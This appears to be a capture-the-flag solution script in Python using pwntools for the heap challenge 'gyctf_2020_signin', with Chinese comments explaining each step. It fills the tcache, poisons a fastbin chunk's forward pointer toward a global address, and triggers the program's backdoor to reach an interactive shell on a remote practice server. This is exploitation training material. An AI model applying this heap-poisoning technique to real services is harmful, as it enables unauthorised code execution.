# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'gyctf_2020_signin'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 28761)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(index):
    p.recvuntil("choice?")
    p.sendline("1")
    p.recvuntil("idx?\n")
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil("choice?")
    p.sendline("2")
    p.recvuntil("idx?\n")
    p.sendline(str(index))
    p.sendline(content)

def delete(index):
    p.recvuntil("choice?")
    p.sendline("3")
    p.recvuntil("idx?\n")
    p.sendline(str(index))

def backdoor():
    p.recvuntil("choice?")
    p.sendline("6")

def pwn():
    ptr = 0x4040c0

    # tcache bins最多容纳7个free chunk
    # 这里提供8个chunk，最后一个chunk在free后被放置在fast bins中
    for i in range(0,8):
        add(i)
    for i in range(0,8):
        delete(i)
    
    # add(8) 申请chunk时，将tcache bins中最后一个放入的chunk重新malloc出来，留出一个tcache bins的空位
    add(8)
    
    # 对fast bins中的chunk进行edit，使其fd指向ptr-0x10，这样ptr会被当作free chunk的fd值
    edit(7, p64(ptr-0x10))
    
    # 当alloc时，不会分配tcache bins中的free chunk
    # 因此在调用backdoor()后，fast bins中的chunk被alloc出来
    # 而fd指向的ptr-0x10，会被glibc认为是free chunk，从而放入tcache bins中
    # 既然是free chunk，那么fd就会指向下一个chunk的fd，自然赋值为next_chunk_fd
    backdoor()
        
    p.interactive()

if __name__ == '__main__':
    pwn()